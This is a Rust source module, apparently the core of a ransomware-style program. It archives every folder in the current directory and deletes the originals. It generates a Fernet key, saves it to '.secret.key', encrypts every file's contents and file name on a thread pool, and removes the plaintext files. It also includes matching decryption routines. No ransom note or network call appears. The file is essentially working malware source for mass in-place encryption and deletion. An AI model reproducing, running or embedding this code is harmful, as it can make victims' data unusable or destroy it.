#![allow(dead_code)]

use crate::encryption;
use crate::models;
use std::fs;
use std::fs::metadata;
use std::fs::File;
use std::io::prelude::*;
use std::io::{Error, ErrorKind};
use std::str;
use std::sync::mpsc;
use std::thread;
use threadpool::ThreadPool;

// This function will create a tar file from a folder
pub fn create_tar_gz(folder_name: &str) -> Result<(), Error> {
    let mut fname = folder_name.to_string();
    fname.push_str(".tar.gz");
    match File::create(&fname) {
        Ok(tar_gz) => {
            let mut tar = tar::Builder::new(tar_gz);
            match tar.append_dir_all(folder_name, folder_name) {
                Ok(_) => {}
                Err(err) => {
                    return Err(err);
                }
            }
        }
        Err(err) => {
            return Err(err);
        }
    }
    println!("Tarring {} to {}", folder_name, &fname);
    match fs::remove_dir_all(&folder_name) {
        Ok(_) => {
            println!("Tarred {} to {}", &folder_name, &fname);
        }
        Err(err) => {
            return Err(err);
        }
    }
    Ok(())
}

// This function will tar the entire folder in the . directory
pub fn tar_all_folders() -> Result<(), Error> {
    let paths = fs::read_dir(".").unwrap();
    let (tx, rx) = mpsc::channel();
    for path in paths {
        match path {
            Ok(path) => match metadata(path.path()) {
                Ok(m) => {
                    if m.is_dir() {
                        let pth = path.path().display().to_string();
                        let tx = tx.clone();
                        thread::spawn(move || {
                            let folder = models::Folder::new(&pth);
                            folder.tar().unwrap();
                            tx.send(0).unwrap();
                        });
                    }
                }
                Err(e) => {
                    return Err(e);
                }
            },
            Err(e) => {
                return Err(e);
            }
        }
    }
    drop(tx);
    for _ in rx {}
    Ok(())
}

// This function will encrypt the a file using fernet key
pub fn encrypt_file(fname: &str, key: &str) -> Result<(), Error> {
    match fs::read(&fname) {
        Ok(content) => match File::create(encryption::encrypt_to_cipher(&key, &fname.as_bytes())) {
            Ok(mut file) => {
                println!("Encrypting {}", &fname);
                file.write_all(encryption::encrypt_to_cipher(&key, &*content).as_bytes())
                    .expect("Cannot write to file");
                println!("Encrypted {}", &fname);
                fs::remove_file(&fname)?;
            }
            Err(err) => {
                return Err(err);
            }
        },
        Err(err) => return Err(err),
    }
    Ok(())
}

// This function will decrypt the file using a fernet key
pub fn decrypt_file(mut fname: &str, key: &str) -> Result<(), Error> {
    let mut file = match File::open(&fname) {
        Ok(file) => file,
        Err(err) => {
            return Err(err);
        }
    };
    let mut encrypted_content = String::new();
    fname = &fname[2..];
    let decrypted_file_name = match encryption::decrypt_to_normal(&key, &fname.to_string()) {
        Ok(result) => result,
        Err(_) => {
            return Err(Error::new(
                ErrorKind::InvalidData,
                "Cannot Decrypt the data",
            ));
        }
    };
    let decrypted_file_name = str::from_utf8(&decrypted_file_name).unwrap();
    match file.read_to_string(&mut encrypted_content) {
        Ok(_) => match encryption::decrypt_to_normal(&key, &encrypted_content) {
            Ok(decrypted_content) => match File::create(decrypted_file_name) {
                Ok(mut out_file) => {
                    println!("Decrypting {}", &fname);
                    out_file
                        .write_all(&*decrypted_content)
                        .expect("Cannot write to file");
                    println!("Decrypted {}", &fname);
                    fs::remove_file(&fname)?;
                }
                Err(err) => {
                    return Err(err);
                }
            },
            Err(_) => {
                return Err(Error::new(
                    ErrorKind::InvalidData,
                    "Cannot Decrypt the data",
                ));
            }
        },
        Err(err) => return Err(err),
    }
    Ok(())
}

// This function will encrypt all the files in the current working directory
pub fn encrypt_all_files() -> Result<(), Error> {
    let (tx, rx) = mpsc::channel();
    let pool = ThreadPool::new(4);
    match fs::read_dir(".") {
        Ok(paths) => {
            let key = fernet::Fernet::generate_key();
            // Trying to reassign from the function (Very bad)
            let key = encryption::write_fernet_key_to_file(key);
            for path in paths {
                let key = key.clone();
                if let Ok(p) = path {
                    let tx = tx.clone();
                    let fname = p.path().display().to_string();
                    if fname != *"./.secret.key".to_string() {
                        pool.execute(move || {
                            let file = models::File::new(&fname, key);
                            file.encrypt();
                            tx.send(1).unwrap();
                        });
                    }
                }
            }
        }
        Err(err) => {
            return Err(err);
        }
    }
    drop(tx);
    for _ in rx {}
    Ok(())
}

// This function will decrypt all the files in the current working directory
pub fn decrypt_all_files() -> Result<(), Error> {
    let (tx, rx) = mpsc::channel();
    let pool = ThreadPool::new(4);
    match fs::read_dir(".") {
        Ok(paths) => {
            let key = encryption::read_fernet_key_from_file();
            for path in paths {
                let key = key.clone();
                match path {
                    Ok(p) => {
                        let tx = tx.clone();
                        let file_name = p.path().display().to_string();
                        if file_name != "./.secret.key" {
                            pool.execute(move || {
                                let file = models::File::new(&file_name, key);
                                file.decrypt().unwrap();
                                tx.send(1).unwrap();
                            });
                        }
                    }
                    Err(err) => {
                        return Err(err);
                    }
                }
            }
        }
        Err(err) => {
            return Err(err);
        }
    }
    drop(tx);
    for _ in rx {}
    Ok(())
}
